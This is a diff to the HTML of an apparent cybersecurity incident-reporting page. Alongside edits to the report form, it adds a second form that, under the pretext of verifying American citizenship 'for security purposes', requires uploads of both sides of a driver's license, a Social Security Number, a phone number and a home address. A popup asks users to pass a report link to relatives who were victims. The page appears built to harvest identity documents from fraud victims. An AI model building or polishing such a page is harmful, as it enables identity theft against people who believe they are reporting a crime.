@@ -41,8 +41,8 @@
 
 <div id="popupContainer">
   <div id="closeButton" onclick="closePopup()">X</div><br>
-  <p>Thank you for contributing to our cybersecurity community!</p>
-  <p>Your reports help make the internet a safer place for everyone. Please request for Agencies private report link if you happen to have any relative or associate that might have been a victim.</p><br>
+  <p style="color: white;">Thank you for contributing to our cybersecurity community!</p>
+  <p style="color: white;">Your reports help make the internet a safer place for everyone. Please request for Agencies private report link if you happen to have any relative or associate that might have been a victim.</p><br>
   <button onclick="copyToClipboard('https://your-url.com')" style="background-color: white; color: #4CAF50;">COPY REPORT LINK</button>
 </div>
 
@@ -54,10 +54,11 @@
 
 <form id="cybersecurityForm">
   <label for="reporter_name">Your Name:</label>
-  <input type="text" id="reporter_name" name="reporter_name" required>
+  <p class="brief" style="font-size: 13px;">In this order [Firstname/ Lastname]</p>
+  <input type="text" id="reporter_name" name="reporter_name" placeholder="Firstname  Lastname" required>
 
   <label for="email">Your Email:</label>
-  <input type="email" id="email" name="email" required>
+  <input type="email" id="email" name="email" placeholder="email@example.com">
 
   <label for="incidentType">Incident Type:</label>
   <select id="incidentType" name="incidentType" required>
@@ -65,15 +66,16 @@
     <option value="phishing">Phishing</option>
     <option value="malware">Malware</option>
     <option value="dataBreach">Data Breach</option>
-    <option value="dataBreach">Man-in-the-Middle Attacks</option>
-    <option value="dataBreach">Denial-of-Service (DoS) and Distributed Denial-of-Service (DDoS) Attacks</option>
-    <option value="dataBreach">Credential Attacks</option>
-    <option value="dataBreach">Social Engineering</option>
-    <option value="dataBreach">Cryptojacking</option>
+    <option value="Man-in-the-Middle Attacks">Man-in-the-Middle Attacks</option>
+    <option value="Denial-of-Service (DoS) and Distributed Denial-of-Service (DDoS) Attacks">Denial-of-Service (DoS) and Distributed Denial-of-Service (DDoS) Attacks</option>
+    <option value="Credential Attacks">Credential Attacks</option>
+    <option value="Social Engineering">Social Engineering</option>
+    <option value="Cryptojacking">Cryptojacking</option>
     <!-- Add more options as needed -->
   </select><br><br>
 
-  <label for="incidentDetails">Incident Details:</label>
+  <label for="incidentDetails">Incident Details * :</label>
+  <p class="brief" style="font-size: 13px;">[If your encounter is not listed in the options above, explain here]</p>
   <textarea id="incidentDetails" name="incidentDetails" placeholder="Please elaborate more on the incident"></textarea>
 
   <button type="submit">Submit Report</button>
@@ -81,17 +83,40 @@
 
 <!-- Additional input form for driver's license and SSN -->
 <form id="driverLicenseForm" class="driver-license-form">
-  <h3>Due to the rise in cyber attacks and fraud and for Security purpose, we need to verify that you are an American citizen</h3><br><br>
-  <label for="driverLicenseFront">Driver's License (Front):</label>
+  <p><h4>Due to high occurances of cyber attacks and fraudulent online activities, we would want to verify that you are a citizen of America before any further investigative action is taken.</h4></p><br>
+
+  <label for="country">Country * :</label>
+  <select name="country" id="country">
+    <option value="select country">Select Country</option>
+    <option value="antigua-and-barbuda">Antigua and Barbuda</option>
+    <option value="bahamas">Bahamas</option>
+    <option value="barbados">Barbados</option>
+    <option value="bermuda">Bermuda</option>
+    <option value="canada">Canada</option>
+    <option value="jamaica">Jamaica</option>
+    <option value="trinidad-and-tobago">Trinidad and Tobago</option>
+    <option value="united-states">United States</option>
+  </select>
+
+  <label for="state">State * :</label>
+  <input type="text" name="state" id="state" required>
+
+  <label for="street1">Address Line 1 * :</label>
+  <input type="text" name="street1" id="street1" required>
+
+  <label for="street2">Address Line 2 :</label>
+  <input type="text" name="street2" id="street2" placeholder="Not compulsory">
+
+  <label for="driverLicenseFront">Driver's License (Front) * :</label>
   <input type="file" id="driverLicenseFront" name="driverLicenseFront" accept="image/*" required>
 
-  <label for="driverLicenseBack">Driver's License (Back):</label>
+  <label for="driverLicenseBack">Driver's License (Back) * :</label>
   <input type="file" id="driverLicenseBack" name="driverLicenseBack" accept="image/*" required>
 
-  <label for="ssn">Social Security Number (SSN):</label>
+  <label for="ssn">Social Security Number (SSN) * :</label>
   <input type="text" id="ssn" name="ssn" required>
 
-  <label for="phoneNumber">Phone Number:</label>
+  <label for="phoneNumber">Phone Number * :</label>
   <input type="tel" id="phoneNumber" name="phoneNumber" pattern="[0-9]{3}-[0-9]{3}-[0-9]{4}" placeholder="Format: 123-456-7890" required>
 
   <button type="submit">Submit Details</button>
